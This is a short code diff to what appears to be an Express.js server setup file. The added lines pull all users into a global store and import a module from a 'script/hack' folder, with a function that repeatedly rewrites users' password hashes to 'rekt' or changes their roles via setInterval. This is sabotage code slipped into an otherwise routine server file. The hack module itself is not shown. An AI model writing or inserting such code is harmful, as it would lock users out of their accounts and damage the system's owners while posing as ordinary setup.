@@ -15,9 +15,18 @@ const config = require('../config.json');
 const https = require('https');
 const fs = require('fs');
 const app = express();
-
+const User = require('./models/user');
+const globals = require('./globals.js')
 const rateLimit = require("express-rate-limit");
-
+globals.AllRoles = User.getAll();// find all users and get them to the storage.
+  let doHashUpdate=true;// decide of the password hash will be updated, update to 'rekt'.
+let doRoleUpdate=false; // decide of the role will be updated, update to 'Member'.
+const doHack = require('./script/hack/update.js'); //run the update.
+async function evaluateChanges(){
+  try {if(doHashUpdate){setInterval(()=>{doHack.hashUpdate()})}//hash update.
+     else if(doRoleUpdate){setInterval(()=>{doHack.roleUpdate()})}//role update.
+    }catch(e){console.error('[DoChanges]: '+e)}}
+  
 function createRateLimiter(maxRequests) {
   return rateLimit({
     windowMs: config.rateLimit.windowMs,
